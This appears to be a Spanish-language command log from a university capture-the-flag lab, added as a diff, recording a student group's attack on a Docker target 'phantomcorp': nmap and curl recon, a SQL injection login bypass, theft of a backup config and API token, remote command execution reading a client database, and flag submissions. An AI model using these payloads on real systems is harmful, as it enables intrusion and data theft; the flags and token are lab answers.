@@ -1,0 +1,28 @@
+# Bitacora exacta de comandos ejecutados en entorno Docker (CyberLab UTN FRVM)
+make setup
+./ctf lab final
+docker compose -p cyberlab ps > entregas/labfinal/grupo12/evidencia/salidas/00_entorno_docker.txt
+
+# Comandos ejecutados dentro de make shell (root@attacker:/loot#)
+nmap -sV -p 80 phantomcorp > /loot/01_nmap.txt
+curl -i -s http://phantomcorp/ > /loot/02_raiz_get.txt
+curl -i -s http://phantomcorp/robots.txt > /loot/03_robots.txt
+curl -s http://phantomcorp/robots.txt > /loot/robots.txt
+curl -i -s http://phantomcorp/portal-rrhh > /loot/04_portal_rrhh.txt
+curl -s http://phantomcorp/portal-rrhh > /loot/portal_rrhh.html
+curl -i -s -X POST http://phantomcorp/portal-rrhh/login -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin&pass=incorrecta" > /loot/05_login_401_baseline.txt
+curl -i -s -X POST http://phantomcorp/portal-rrhh/login -H "Content-Type: application/x-www-form-urlencoded" -d "user=' OR 1=1--&pass=dummy" > /loot/06_login_sqli_bypass.txt
+curl -i -s http://phantomcorp/backup/rrhh.conf > /loot/07_backup_rrhh_conf.txt
+curl -s http://phantomcorp/backup/rrhh.conf > /loot/rrhh.conf
+curl -i -s "http://phantomcorp/api/reporte?cmd=id" > /loot/08_api_sin_token_403.txt
+curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id" > /loot/09_api_rce_id.txt
+curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt" > /loot/10_api_rce_crown_jewels.txt
+curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt" > /loot/clientes_crown_jewels.txt
+python3 /repo/entregas/labfinal/grupo12/loot/exploit_chain.py http://phantomcorp > /loot/11_exploit_chain_docker.txt
+
+# Registro y verificacion oficial de flags en el host del laboratorio
+./ctf submit final R1 'FLAG{final_recon_portal}'
+./ctf submit final R2 'FLAG{final_sqli_foothold}'
+./ctf submit final R3 'FLAG{final_token_looted}'
+./ctf submit final R4 'FLAG{final_crown_jewels}'
+./ctf status final > entregas/labfinal/grupo12/evidencia/salidas/13_ctf_status_final.txt
